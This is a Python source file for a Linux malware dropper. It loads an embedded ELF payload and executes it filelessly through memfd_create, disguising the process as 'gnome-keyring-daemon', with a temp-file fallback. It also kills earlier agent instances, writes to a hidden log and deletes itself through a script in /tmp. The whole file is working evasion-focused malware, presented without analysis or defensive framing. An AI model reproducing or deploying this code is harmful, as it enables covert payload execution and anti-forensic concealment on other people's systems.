import os
import sys
import platform
import ctypes
import subprocess
import time
import tempfile
from datetime import datetime
from agent_payload_embed import EMBEDDED_PAYLOAD

SELF_DELETE = True
MASQUERADE_AS = "gnome-keyring-daemon"
LOG_PATH = "/var/log/.agent_exec.log"

if not hasattr(os, 'memfd_create'):
    libc = ctypes.CDLL("libc.so.6")
    def memfd_create(name, flags):
        return libc.syscall(319, name.encode(), flags)
    os.memfd_create = memfd_create

def log(msg):
    try:
        with open(LOG_PATH, "a") as log_file:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_file.write(f"[{timestamp}] {msg}\n")
    except Exception:
        pass

def self_delete():
    path = sys.argv[0]
    deleter = f"/tmp/.deleter_{int(time.time())}.sh"
    with open(deleter, "w") as f:
        f.write(f"#!/bin/bash\nsleep 2\nrm -f '{path}'\nrm -f '{deleter}'\n")
    os.chmod(deleter, 0o700)
    subprocess.Popen(["/bin/bash", deleter])

def kill_existing_agents():
    try:
        output = subprocess.check_output(["ps", "aux"]).decode()
        for line in output.splitlines():
            if "/tmp/tmp" in line and "python" in line:
                pid = int(line.split()[1])
                os.kill(pid, 9)
                log(f"Killed existing agent with PID {pid}")
    except Exception as e:
        log(f"Failed to kill existing agents: {e}")

def run_memfd(payload):
    try:
        fd = os.memfd_create(MASQUERADE_AS, 0)
        os.write(fd, payload)
        os.lseek(fd, 0, os.SEEK_SET)
        subprocess.Popen([f"/proc/self/fd/{fd}"], close_fds=True)
        log("Executed payload via memfd.")
        return True
    except Exception as e:
        log(f"memfd_create failed: {e}")
        return False

def run_temp_exec(payload):
    try:
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(payload)
            temp_path = f.name
        os.chmod(temp_path, 0o755)
        subprocess.Popen([temp_path], close_fds=True)
        log(f"Executed payload via temp file: {temp_path}")
        return True
    except Exception as e:
        log(f"Temp execution failed: {e}")
        return False

def find_target_process():
    targets = ["bash", "zsh", "xfce4-terminal", "gnome-terminal", "qterminal"]
    for pid in os.listdir("/proc"):
        if not pid.isdigit():
            continue
        try:
            with open(f"/proc/{pid}/comm", "r") as f:
                name = f.read().strip()
                if name in targets:
                    log(f"Found target process: {pid} ({name})")
                    return name
        except:
            continue
    return None

def inject(payload):
    target = find_target_process()
    if not target:
        log("No valid target process found.")
        return False
    kill_existing_agents()
    log("Attempting memfd injection...")
    if run_memfd(payload):
        return True
    log("Falling back to temp file execution...")
    return run_temp_exec(payload)

def main():
    log("Dropper started.")

    if platform.system() != "Linux":
        log("Unsupported OS.")
        return

    if not EMBEDDED_PAYLOAD.startswith(b'\x7fELF'):
        log("Invalid ELF payload.")
        return

    success = inject(EMBEDDED_PAYLOAD)

    if success:
        log("Agent launched successfully.")
        if SELF_DELETE:
            self_delete()
    else:
        log("Agent injection failed.")

if __name__ == "__main__":
    main()
